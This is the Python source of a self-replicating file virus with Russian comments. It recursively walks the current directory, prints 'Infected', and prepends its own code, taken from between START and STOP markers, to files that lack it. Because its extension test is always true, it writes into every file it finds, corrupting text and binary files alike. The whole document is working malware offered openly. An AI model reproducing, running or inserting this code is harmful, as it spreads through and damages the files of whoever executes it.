# START#
import sys
import os


def virus(python):  # основная функция самокопирования
    begin = "# START#\n"  # первая строчка копирования
    end = "# STOP#\n"  # последняя строчка копирования
    with open(sys.argv[0], "r") as copy:  # читаем атакуемый файл
        k = 0  # счётчик
        virus_code = "\n"  # добавляем лишнюю строку для отделения исходного файла от вируса
        for line in copy:  # построчно просматриваем файл
            if line == begin:  # если начало файла - триггер
                k = 1  # счётчик - 1
                virus_code += begin  # вставляем триггер
            elif k == 1 and line != end:  # если начальный триггер активирован, а конечный - нет, ...
                virus_code += line  # ... построчно копируем вирус
            elif line == end:  # если дошли до нижнего триггера, ...
                virus_code += end  # ... добавляем его и ...
                break  # ... завершаем процесс
            else:  # если начало файла - не триггер, ...
                pass  # ... пропускаем его
    with open(python, "r") as file:  # снова читаем атакуемый файл
        original_code = ""  # вводим переменную для исходного кода атакуемого файла
        for line in file:
            original_code += line  # построчно вводим код в переменную
            if line == begin:  # если начало файла - триггер, ...
                vir = True  # ... вирус в нём есть и ...
                break  # ... мы останавливаемся
            else:  # если начало файла - не триггер, ...
                vir = False  # ... вируса в нём нет
    if not vir:  # если вируса в файле нет, ...
        with open(python, "w") as paste:  # ... открываем его и ...
            paste.write(virus_code + "\n\n" + original_code)  # ... пишем в нём вирус и после вируса - оригинальный код
    else:
        pass


def code(void):  # функция-сообщения об атаке
    print("Infected")


code(None)  # активация функции code


def walk(dir):  # парсер директорий
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):  # если файт, ...
            if (os.path.splitext(path)[1] == ".py" or ".cpp" or ".txt"):  # ... ищем файлы с указанным расширением и ...
                virus(path)  # ... активируем функцию на нём
            else:
                pass
        else:  # если папка, ...
            walk(path)  # ... заходим в неё и повторяем


walk(os.getcwd())  # начитаем атаку из папки с вирусом
# STOP#
